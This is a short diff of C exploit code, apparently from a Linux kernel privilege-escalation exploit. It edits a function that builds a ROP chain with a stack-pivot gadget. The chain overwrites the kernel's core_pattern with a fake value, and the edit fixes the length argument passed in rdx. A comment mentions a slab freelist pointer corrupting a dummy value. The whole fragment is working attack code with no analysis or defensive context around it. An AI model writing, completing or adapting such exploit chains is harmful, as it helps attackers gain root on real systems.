@@ -131,7 +131,8 @@ void init_payload(char *p, size_t size)
 	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;
 
 	rop_chain_2[offset++] = POP_RDX_POP_RDI;
-	rop_chain_2[offset++] = 0x30; /* the value for rdx, function parameter #3 */
+	rop_chain_2[offset++] = strlen(fake_core_pattern) + 1; /* the value for rdx,
+								  function parameter #3 */
 	rop_chain_2[offset++] = CORE_PATTERN_PTR; /* the value for rdi, function parameter #1 */
 	rop_chain_2[offset++] = POP_RSI;
 	rop_chain_2[offset++] = 0x42; /* dummy value that will be corrupted by a slab freelist ptr,
